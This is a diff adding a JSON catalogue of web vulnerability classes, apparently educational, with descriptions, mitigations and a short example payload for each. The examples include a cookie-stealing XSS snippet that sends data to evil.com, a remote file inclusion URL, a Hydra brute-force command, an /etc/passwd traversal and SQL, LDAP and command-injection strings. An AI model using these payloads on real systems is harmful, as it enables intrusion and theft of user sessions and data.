@@ -1,0 +1,422 @@
+[
+  {
+    "name": "Default Credentials",
+    "short_description": "Many systems ship with default usernames and passwords that attackers can guess easily.",
+    "detailed_description": "Applications, routers, admin panels, and CMS platforms often ship with default credentials like 'admin:admin', 'root:toor', or 'user:password'. If the admin fails to change these after deployment, attackers can log in without any hacking required. Attackers often maintain lists of default creds for popular platforms (e.g., Tomcat, WordPress, Jenkins) and test them as a first step in exploitation.This is one of the most basic but frequently exploited security flaws, especially in IoT and CMS platforms. Attackers scan large IP ranges for default-access systems and automate logins. Organizations must enforce credential rotation, disable unused accounts, and monitor for failed login attempts.",
+    "example": "POST /admin/login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Weak Password Policies",
+    "short_description": "Poor password rules allow attackers to guess or brute-force access easily.",
+    "detailed_description": "If an application allows passwords like '123456', 'password', or the username itself, attackers can compromise accounts with minimal effort. Weak policies encourage reuse, reduce entropy, and expose accounts to dictionary attacks. Strong policies should enforce minimum length, complexity (uppercase, lowercase, numbers, special characters), and disallow common passwords.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Allowed password: admin123",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Password Reuse",
+    "short_description": "Using the same password across different sites makes users vulnerable to credential stuffing.",
+    "detailed_description": "When users reuse passwords, a breach on one site (e.g., a gaming platform) can compromise their accounts on another (like a bank or email). Attackers use automated tools to test credentials from leaked databases across popular sites. Credential stuffing often bypasses rate limits if distributed across IPs.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "for creds in leaked_list:\n    try_login(target=\"bank.com\", username=creds[\"email\"], password=creds[\"pass\"])",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Weak Lockout Mechanism",
+    "short_description": "If login attempts are not rate-limited, attackers can brute-force passwords freely.",
+    "detailed_description": "Without a proper lockout or rate-limiting mechanism, attackers can try thousands of passwords per account using tools like Burp Suite, Hydra, or custom scripts. Lack of lockouts leads to brute-force and password spraying success. CAPTCHA alone is insufficient if it's poorly integrated.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "hydra -l admin -P rockyou.txt target.com http-post-form \"/login:username=^USER^&password=^PASS^:F=incorrect\"",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Weak Security Questions",
+    "short_description": "Predictable security questions can let attackers reset your password without hacking.",
+    "detailed_description": "Questions like \u201cWhat\u2019s your pet\u2019s name?\u201d or \u201cWhere were you born?\u201d are often guessable or obtainable via social media or OSINT. If the app allows resets based on these, attackers can bypass all authentication. These questions introduce more risk than value, especially for public figures or exposed users.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Answer: 'fluffy' \u2190 Found from Facebook",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Insecure Password Reset / Change Flow",
+    "short_description": "Improper token handling in reset flows can allow unauthorized access to accounts.",
+    "detailed_description": "Password reset functionality often uses emailed tokens (reset?token=xyz) that can be guessed, reused, or don't expire. Attackers may sniff, steal, or manipulate tokens to hijack accounts. If users can change passwords without verifying old ones, session fixation becomes a risk.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /reset-password?token=abc123  # Reusable token",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Authentication Bypass via Parameter Tampering",
+    "short_description": "Manipulating request parameters may trick the server into skipping login validation.",
+    "detailed_description": "If authentication logic relies on user-controlled parameters like 'authenticated=true', attackers can alter requests to gain access. Developers often trust hidden fields or client-side logic, which attackers can override in tools like Burp.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "POST /login\nusername=admin&password=wrong&authenticated=true",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Session ID Prediction",
+    "short_description": "Predictable session IDs let attackers hijack authenticated user sessions.",
+    "detailed_description": "If the session tokens are numeric, sequential, or otherwise guessable, an attacker can generate valid tokens and impersonate users. This is especially dangerous for admin accounts and is a form of session fixation.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Set-Cookie: sessionid=1001  # Attacker tries 1002, 1003\u2026",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Token Replay & Session Reuse",
+    "short_description": "Tokens or cookies that don\u2019t expire can be reused maliciously.",
+    "detailed_description": "Access tokens, session cookies, or password reset links may remain valid even after logout or password change. Attackers can capture these tokens and reuse them later to re-enter accounts. This is often missed in mobile apps and SPAs.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Authorization: Bearer abc123  # Still valid after logout",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Weak 2FA Implementation",
+    "short_description": "Poorly implemented 2FA can be bypassed through logic flaws or missing enforcement.",
+    "detailed_description": "Some apps 'fake' 2FA by allowing login if the OTP is missing or invalid. Others validate it client-side or send tokens over insecure channels. Attackers can tamper with the request, reuse old OTPs, or exploit logic bugs to bypass 2FA completely.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "POST /verify-2fa\notp=",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Account Enumeration",
+    "short_description": "Different responses for valid vs. invalid usernames reveal which accounts exist.",
+    "detailed_description": "Login forms, forgot-password flows, or registration pages sometimes return different messages depending on the existence of the username. Attackers automate username discovery, especially for high-value targets.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "\"Username does not exist\" vs \"Incorrect password\"",
+    "list": "Authentication & Identity Flaws"
+  },
+  {
+    "name": "Insecure Direct Object Reference (IDOR)",
+    "short_description": "Attackers manipulate object references to access unauthorized data.",
+    "detailed_description": "IDOR occurs when an application uses user-supplied input to access objects directly, such as database records or files, without proper authorization checks. If access control is missing, an attacker can change input values to access other users' data or actions. This often appears in URLs, form parameters, or JSON payloads.This flaw has led to massive data leaks in APIs, mobile apps, and admin portals. Developers must enforce object-level authorization and never rely solely on client-side controls or predictable IDs.",
+    "example": "GET /user/profile?id=123  # Change to id=124 to access another user's profile",
+    "list": "Authorization Flaws"
+  },
+  {
+    "name": "Privilege Escalation",
+    "short_description": "Users gain access to actions or data meant for higher privilege levels.",
+    "detailed_description": "Privilege escalation occurs when a user bypasses controls and gains access to functions, features, or data reserved for more privileged users (e.g., standard user accessing admin endpoints). This can happen due to weak role checks or relying on frontend logic.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "POST /admin/delete-user?id=5  # Sent by non-admin user and accepted by server",
+    "list": "Authorization Flaws"
+  },
+  {
+    "name": "Parameter Tampering",
+    "short_description": "Attackers alter parameters to bypass authorization or gain access to restricted resources.",
+    "detailed_description": "When sensitive values (like user ID or role) are passed as parameters, attackers can change them to escalate privileges or gain access. If the server doesn't validate that the user is authorized to perform the requested action, tampering succeeds.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "POST /transfer-money  amount=1000&user_id=2  # Change user_id to 1 to access another account",
+    "list": "Authorization Flaws"
+  },
+  {
+    "name": "Forced Browsing",
+    "short_description": "Manually accessing unlinked resources without proper authorization.",
+    "detailed_description": "Forced browsing refers to accessing internal or restricted resources by guessing or discovering URLs. If the application does not check authorization on those endpoints, users can access admin pages, sensitive documents, or system configurations without being authorized.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /admin/panel  # Accessed by non-admin user directly",
+    "list": "Authorization Flaws"
+  },
+  {
+    "name": "Authorization Bypass via Custom Headers",
+    "short_description": "Manipulating headers like X-User or X-Role to spoof identities or roles.",
+    "detailed_description": "Some applications (especially behind proxies) use custom HTTP headers for identity or role enforcement. Attackers can forge these headers to impersonate other users or escalate their access if server-side validation is missing or weak.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "X-User: admin  # Added manually to elevate privileges",
+    "list": "Authorization Flaws"
+  },
+  {
+    "name": "Session Fixation",
+    "short_description": "Attackers reuse a known session ID to impersonate a user after login.",
+    "detailed_description": "In session fixation, the attacker sets a known session ID for the victim before login. If the application doesn't issue a new session ID upon authentication, the attacker can use the same ID to hijack the victim\u2019s session after they log in.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Set-Cookie: PHPSESSID=attacker_known_id  # Victim logs in without new session ID being issued",
+    "list": "Session Management Flaws"
+  },
+  {
+    "name": "Session Hijacking",
+    "short_description": "Attackers steal a valid session ID to take over an active session.",
+    "detailed_description": "Session hijacking occurs when an attacker captures a user's valid session token (via XSS, sniffing, or insecure storage) and uses it to impersonate them. This can happen if tokens are transmitted insecurely or not tied to client attributes like IP or user-agent.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Authorization: Bearer hijacked_token",
+    "list": "Session Management Flaws"
+  },
+  {
+    "name": "Missing Secure Cookie Flags",
+    "short_description": "Cookies without Secure/HttpOnly/SameSite flags expose session data to attacks.",
+    "detailed_description": "Cookies used for session management must be protected using flags like 'Secure' (transmit only over HTTPS), 'HttpOnly' (not accessible via JS), and 'SameSite' (prevent CSRF). Without these, attackers may access or steal the session tokens.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Set-Cookie: sessionid=abc123; Path=/  # Missing Secure and HttpOnly",
+    "list": "Session Management Flaws"
+  },
+  {
+    "name": "No Session Timeout",
+    "short_description": "Sessions that never expire increase the risk of unauthorized access.",
+    "detailed_description": "If a session token remains valid indefinitely, it increases the window for exploitation. Tokens should expire after a period of inactivity or absolute time. Lack of timeouts is often exploited in shared devices or unattended sessions.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Session persists after 24 hours of inactivity",
+    "list": "Session Management Flaws"
+  },
+  {
+    "name": "Back Button Access Post Logout",
+    "short_description": "Users can access authenticated pages using browser history after logging out.",
+    "detailed_description": "If pages are cached and session invalidation is not handled properly, users might be able to access sensitive pages by clicking the browser's back button even after logout. This is a common oversight in session destruction mechanisms.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Logout \u2192 Back \u2192 Dashboard reappears",
+    "list": "Session Management Flaws"
+  },
+  {
+    "name": "Reflected Cross-Site Scripting (XSS)",
+    "short_description": "Injecting malicious scripts into a web page that reflects user input.",
+    "detailed_description": "Reflected XSS occurs when user-supplied data in a request (e.g., URL parameters or form inputs) is immediately included in the response without proper sanitization. This allows attackers to execute malicious JavaScript in the victim\u2019s browser when they click a crafted link.Effective mitigations include context-aware output encoding (HTML, JavaScript, URL), content security policies (CSP), and input validation. Reflected XSS is commonly used in phishing attacks by embedding malicious payloads in URLs.",
+    "example": "GET /search?q=<script>alert(1)</script>",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "Stored Cross-Site Scripting (XSS)",
+    "short_description": "Malicious scripts are permanently stored on the server and served to users.",
+    "detailed_description": "Stored XSS occurs when user input (e.g., comments, profile info) is stored on the server and then rendered without sanitization. All users who view the infected page execute the malicious script, making it more dangerous than reflected XSS.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "<script>fetch('https://evil.com/cookie?c=' + document.cookie)</script> stored in profile bio",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "SQL Injection",
+    "short_description": "Injection of SQL commands via unsanitized user inputs.",
+    "detailed_description": "SQL injection occurs when user inputs are directly embedded into SQL queries without proper escaping or parameterization. Attackers can manipulate queries to extract data, bypass authentication, or even perform destructive actions like dropping tables.This is one of the oldest and most dangerous web vulnerabilities, allowing attackers to extract or tamper with backend data. Using parameterized queries (prepared statements) and strict input validation are the primary defenses. It has led to numerous data breaches including high-profile cases like TalkTalk and Heartland Payment Systems.",
+    "example": "username=admin' OR '1'='1&password=anything",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "Command Injection",
+    "short_description": "Executing arbitrary system commands via vulnerable input fields.",
+    "detailed_description": "Command injection vulnerabilities allow attackers to execute system-level commands on the host server. This happens when user inputs are concatenated into command-line arguments without proper sanitization or validation.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "input=; ls -la",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "Local File Inclusion (LFI)",
+    "short_description": "Exploiting path traversal to read sensitive server files.",
+    "detailed_description": "LFI vulnerabilities allow attackers to include files from the local server file system by manipulating file path parameters. Common targets include '/etc/passwd', application logs, or session data.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /page?file=../../../../etc/passwd",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "Remote File Inclusion (RFI)",
+    "short_description": "Inclusion of remote files via manipulated input fields.",
+    "detailed_description": "RFI allows attackers to load external scripts from remote URLs into the application. If input values are used to include files without validation, attackers can point to a malicious URL hosting harmful scripts.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /page?file=http://evil.com/shell.txt",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "XML Injection",
+    "short_description": "Tampering with XML data structures to alter logic or extract data.",
+    "detailed_description": "XML injection happens when user input is inserted into XML documents without proper encoding. This can allow attackers to manipulate queries (XPath injection), modify application behavior, or access sensitive data.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "<user><name>admin' OR '1'='1</name></user>",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "XPath Injection",
+    "short_description": "Injection into XPath queries to extract unauthorized XML data.",
+    "detailed_description": "Similar to SQL injection, XPath injection targets XML-based data queries. Attackers manipulate XPath expressions to bypass authentication or retrieve confidential XML elements by injecting malicious data into query structures.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "username=admin' or '1'='1",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "HTTP Parameter Pollution (HPP)",
+    "short_description": "Injecting multiple parameters with the same name to manipulate logic.",
+    "detailed_description": "HPP occurs when multiple instances of the same parameter are passed in a request (e.g., ?user=admin&user=attacker). Depending on how the server handles these parameters, it may overwrite values or execute multiple operations, potentially leading to privilege escalation or bypasses.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /profile?role=user&role=admin",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "LDAP Injection",
+    "short_description": "Manipulating LDAP queries using unsanitized input.",
+    "detailed_description": "LDAP injection allows attackers to alter LDAP (Lightweight Directory Access Protocol) queries by injecting special characters into search filters or queries. This may result in authentication bypass, privilege escalation, or sensitive data disclosure.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "username=*admin*)(|(password=*))",
+    "list": "Input Validation Flaws"
+  },
+  {
+    "name": "Clickjacking",
+    "short_description": "Tricking users into clicking hidden UI elements using iframes.",
+    "detailed_description": "Clickjacking involves embedding a legitimate web page inside an invisible iframe layered over a deceptive UI. Users think they're clicking a visible element but actually interact with the framed page, possibly authorizing transactions or changing settings unknowingly.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "<iframe src='https://target.com' style='opacity:0; position:absolute; top:0; left:0; width:100%; height:100%'></iframe>",
+    "list": "Client-Side & UI Attacks"
+  },
+  {
+    "name": "Cross-Origin Resource Sharing (CORS) Misconfiguration",
+    "short_description": "Improper CORS policies can expose sensitive data to unauthorized domains.",
+    "detailed_description": "CORS headers determine which domains can access resources across origins. If overly permissive (e.g., Access-Control-Allow-Origin: * or echoing origin headers without validation), it may expose APIs to cross-site abuse, enabling data theft or account hijacking.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Access-Control-Allow-Origin: *",
+    "list": "Client-Side & UI Attacks"
+  },
+  {
+    "name": "Cross-Site Script Inclusion (XSSI)",
+    "short_description": "Leaking sensitive JavaScript data by embedding scripts into other sites.",
+    "detailed_description": "XSSI occurs when sensitive JavaScript files return user-specific data without proper headers. These files can be loaded from another site to leak information to unauthorized domains, often in combination with browser features like `<script src=...>`.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "<script src='https://target.com/user-info.js'></script>",
+    "list": "Client-Side & UI Attacks"
+  },
+  {
+    "name": "DOM-Based XSS",
+    "short_description": "Client-side scripts process user input unsafely in the DOM.",
+    "detailed_description": "DOM-based XSS occurs entirely on the client side, where JavaScript modifies the DOM based on user input. If input is not sanitized before insertion into the DOM (e.g., innerHTML), attackers can execute arbitrary scripts without server involvement.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "location.hash = \"#<img src=x onerror=alert(1)>\"; document.body.innerHTML = location.hash;",
+    "list": "Client-Side & UI Attacks"
+  },
+  {
+    "name": "Open Redirect",
+    "short_description": "Redirecting users to untrusted sites using user-supplied URLs.",
+    "detailed_description": "Open redirects occur when applications allow unvalidated URLs in redirect parameters (e.g., `?next=`), which can be manipulated to send users to malicious domains. This is often exploited in phishing and malware delivery campaigns.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /redirect?url=http://evil.com",
+    "list": "Client-Side & UI Attacks"
+  },
+  {
+    "name": "Broken Business Logic",
+    "short_description": "Application logic fails to enforce expected workflows or rules.",
+    "detailed_description": "Business logic flaws occur when developers implement workflows that can be abused or bypassed by users. This includes manipulating order prices, skipping validation steps, or misusing workflows like refunds or rewards systems.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Changing the price in cart via developer tools before checkout",
+    "list": "Business Logic / App Flow Issues"
+  },
+  {
+    "name": "Parameter Manipulation",
+    "short_description": "Altering business-relevant parameters like prices or roles to gain unfair advantage.",
+    "detailed_description": "Attackers manipulate parameters involved in application logic, such as price, quantity, discount codes, or user roles. Without server-side enforcement, these changes can lead to financial fraud or unauthorized access.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "price=1  (changed from price=100 on the frontend)",
+    "list": "Business Logic / App Flow Issues"
+  },
+  {
+    "name": "Improper Access to Unreleased Features",
+    "short_description": "Accessing or activating features not yet available to users.",
+    "detailed_description": "Some applications expose under-development features in the frontend but disable them via UI flags. Attackers can manipulate requests to unlock these features and test or abuse them prematurely.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Accessing /beta-upload via direct URL or by modifying a feature flag",
+    "list": "Business Logic / App Flow Issues"
+  },
+  {
+    "name": "Discount/Promo Abuse",
+    "short_description": "Reusing or stacking discounts to exploit pricing logic.",
+    "detailed_description": "Abusing business workflows to apply expired, stacked, or reused promo codes can lead to large-scale financial loss. This often happens due to poor backend checks or poor rate-limiting on code usage.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Apply 50% promo code multiple times by replaying request",
+    "list": "Business Logic / App Flow Issues"
+  },
+  {
+    "name": "Improper Validation of Purchase/Action Limits",
+    "short_description": "Bypassing limits on free items, trials, or rate-capped features.",
+    "detailed_description": "When apps enforce limits only on the client side (e.g., one free item per user), attackers can bypass them by creating new accounts, spoofing headers, or manipulating requests to gain unlimited access to resources.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Sign up repeatedly with disposable emails to claim free rewards",
+    "list": "Business Logic / App Flow Issues"
+  },
+  {
+    "name": "Insecure HTTP Methods",
+    "short_description": "Enabling unsafe HTTP methods can lead to unauthorized actions.",
+    "detailed_description": "Some HTTP methods like PUT, DELETE, or TRACE may allow attackers to upload files, modify server resources, or conduct cross-site tracing (XST) attacks. Applications should disable all non-essential HTTP methods and ensure proper access control.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "curl -X PUT http://example.com/test.txt -d 'hello world'",
+    "list": "Server/Infra Misconfigurations"
+  },
+  {
+    "name": "Exposed Admin Interfaces",
+    "short_description": "Access to internal or admin panels without restriction.",
+    "detailed_description": "Administrative panels, infrastructure dashboards, or debug UIs exposed to the public can be a goldmine for attackers. If they are not protected by authentication, IP filtering, or VPNs, attackers can perform privileged actions or leak data.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /admin/login",
+    "list": "Server/Infra Misconfigurations"
+  },
+  {
+    "name": "Directory Listing Enabled",
+    "short_description": "Unintended file listings can reveal sensitive files and structure.",
+    "detailed_description": "When directory listing is not disabled on the server, navigating to folders without an index file shows all contents. This can leak backups, credentials, or internal scripts useful for further exploitation.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /uploads/ returns list of all files",
+    "list": "Server/Infra Misconfigurations"
+  },
+  {
+    "name": "Backup and Unreferenced Files Accessible",
+    "short_description": "Old or backup files available publicly may expose vulnerabilities.",
+    "detailed_description": "Backup files like `index.php~`, `config.bak`, `.git`, or `.svn` can leak source code, credentials, or config settings. These files are often left behind after deployments or testing, and should not be publicly accessible.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "GET /.git/config reveals repo and credentials",
+    "list": "Server/Infra Misconfigurations"
+  },
+  {
+    "name": "Subdomain Takeover",
+    "short_description": "Unclaimed subdomains pointing to external services can be hijacked.",
+    "detailed_description": "If a subdomain points to an external service (e.g., GitHub Pages, Heroku) but is not actively claimed, attackers can register the resource and take control of the subdomain. This is commonly used in phishing, data theft, and brand impersonation attacks.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "sub.domain.com CNAME to unclaimed github.io site",
+    "list": "Server/Infra Misconfigurations"
+  },
+  {
+    "name": "Verbose Error Messages",
+    "short_description": "Detailed error messages expose internal server or application details.",
+    "detailed_description": "Exposing full error traces, stack dumps, or database errors (like SQL exceptions) provides valuable information to attackers. This may include table names, internal paths, or stack traces useful for targeting vulnerabilities.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "500 Internal Server Error: java.sql.SQLException: Table 'users' doesn't exist",
+    "list": "Error Handling & Info Leaks"
+  },
+  {
+    "name": "Technology Disclosure",
+    "short_description": "Server headers or debug messages leak technology stack information.",
+    "detailed_description": "HTTP headers or application messages may reveal versions of frameworks, libraries, or servers in use. This helps attackers craft targeted exploits for known vulnerabilities in specific software versions.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "X-Powered-By: PHP/5.6.0",
+    "list": "Error Handling & Info Leaks"
+  },
+  {
+    "name": "Path Disclosure",
+    "short_description": "Exposed internal file paths reveal directory structure of the server.",
+    "detailed_description": "Error messages may disclose full local paths (e.g., /var/www/html/index.php), which helps attackers map file locations and gain context for LFI/RFI or RCE attempts.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Warning: include(/var/www/html/conf.php): failed to open stream",
+    "list": "Error Handling & Info Leaks"
+  },
+  {
+    "name": "Insecure SSL/TLS Configuration",
+    "short_description": "Using outdated or weak SSL/TLS protocols compromises data confidentiality.",
+    "detailed_description": "Applications that support insecure protocols like SSLv2, SSLv3, or early TLS versions (1.0/1.1) are vulnerable to known cryptographic attacks. These include BEAST, POODLE, LUCKY13, and others. Weak cipher suites (e.g., RC4, NULL, export-grade) further degrade encryption strength.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "SSLv3 supported \u2192 vulnerable to POODLE attack",
+    "list": "Cryptography & Transport Security"
+  },
+  {
+    "name": "Use of Weak or Deprecated Hash Algorithms",
+    "short_description": "Hash algorithms like MD5 or SHA-1 are broken and should not be used.",
+    "detailed_description": "MD5 and SHA-1 are vulnerable to collision attacks and should not be used for password hashing or digital signatures. Their continued use puts integrity and authentication guarantees at risk, particularly in token signing or file integrity checks.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Digital signature uses SHA-1 \u2192 attacker can forge a valid-looking certificate",
+    "list": "Cryptography & Transport Security"
+  },
+  {
+    "name": "No HTTPS Enforcement",
+    "short_description": "Lack of HTTPS or HSTS allows data to be intercepted or modified.",
+    "detailed_description": "If applications allow HTTP access or don\u2019t enforce secure connections via HSTS headers, attackers can downgrade connections or intercept traffic using man-in-the-middle (MITM) attacks. All pages handling sensitive data should strictly use HTTPS.Attackers can intercept credentials, inject scripts, or modify site content during transit. Always use HTTPS with HSTS headers, and redirect all HTTP traffic to HTTPS by default.",
+    "example": "Login page available on http://example.com/login",
+    "list": "Cryptography & Transport Security"
+  },
+  {
+    "name": "Race Condition",
+    "short_description": "Multiple concurrent requests exploit timing issues to bypass logic.",
+    "detailed_description": "Race conditions happen when a system doesn\u2019t properly handle multiple simultaneous operations. Attackers exploit this by rapidly sending parallel requests to trigger logic errors \u2014 such as using the same promo code twice or overdrawing from an account.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Send 10 concurrent POST /checkout requests \u2192 All orders succeed with the same coupon",
+    "list": "Race Conditions & Timing"
+  },
+  {
+    "name": "Timing Attacks",
+    "short_description": "Analyzing response times to infer sensitive information.",
+    "detailed_description": "Timing attacks exploit variations in server response times to reveal secrets like valid usernames, tokens, or even password characters. For example, a password comparison that stops on the first mismatch leaks character positions by latency.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Measure response times for token=abc, abcd, abcde to find correct token character-by-character",
+    "list": "Race Conditions & Timing"
+  },
+  {
+    "name": "Prototype Pollution",
+    "short_description": "Manipulating JavaScript object prototypes to alter application behavior.",
+    "detailed_description": "Prototype pollution occurs when an attacker can modify the prototype of global objects in JavaScript. By injecting properties like `__proto__`, they can affect object inheritance chains and potentially hijack application logic or cause denial of service.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "payload: { \"__proto__\": { \"isAdmin\": true } }",
+    "list": "Prototype & Deserialization Attacks"
+  },
+  {
+    "name": "Insecure Deserialization",
+    "short_description": "Executing malicious code during object deserialization.",
+    "detailed_description": "Insecure deserialization vulnerabilities occur when untrusted input is deserialized without proper validation or filtering. Attackers craft payloads that exploit classes on the server to perform unintended operations, such as remote code execution.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Serialized Java object with malicious method override \u2192 triggers RCE upon deserialization",
+    "list": "Prototype & Deserialization Attacks"
+  },
+  {
+    "name": "Dependency Confusion",
+    "short_description": "Private packages are overridden by malicious public versions.",
+    "detailed_description": "If an application references internal packages not scoped correctly, attackers can publish malicious versions of these packages to public repositories. Build systems might mistakenly install the malicious version, compromising the supply chain.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Public npm package 'internal-lib' overrides private 'internal-lib' used in company app",
+    "list": "Tool-Assisted Issues"
+  },
+  {
+    "name": "Debug Info Exposure",
+    "short_description": "Leaked debug artifacts reveal sensitive information.",
+    "detailed_description": "Debug files such as `.map` files, stack traces, or verbose logs may reveal source code, endpoints, and internal logic. These files are useful for developers but should not be exposed in production.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Accessing main.min.js.map reveals full JS source code",
+    "list": "Tool-Assisted Issues"
+  },
+  {
+    "name": "Broken Link Hijacking",
+    "short_description": "Unclaimed links to external assets allow attackers to take over and inject content.",
+    "detailed_description": "If a website links to external scripts, images, or fonts on third-party domains that expire or become unregistered, an attacker can claim them. This allows injection of malicious content or phishing on otherwise trusted domains.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Linked to https://cdn.example.xyz/script.js \u2192 domain expired and hijacked",
+    "list": "Miscellaneous"
+  },
+  {
+    "name": "No Rate Limiting",
+    "short_description": "Endpoints with no request limit allow brute-force or abuse at scale.",
+    "detailed_description": "Without rate limiting, attackers can send high volumes of requests to endpoints like login, password reset, or search. This enables brute-force attacks, scraping, or denial-of-service without being throttled or blocked.Organizations should ensure secure development practices, perform regular vulnerability assessments, and implement automated defenses where possible.",
+    "example": "Send 10,000 login attempts via script without detection",
+    "list": "Miscellaneous"
+  }
+]
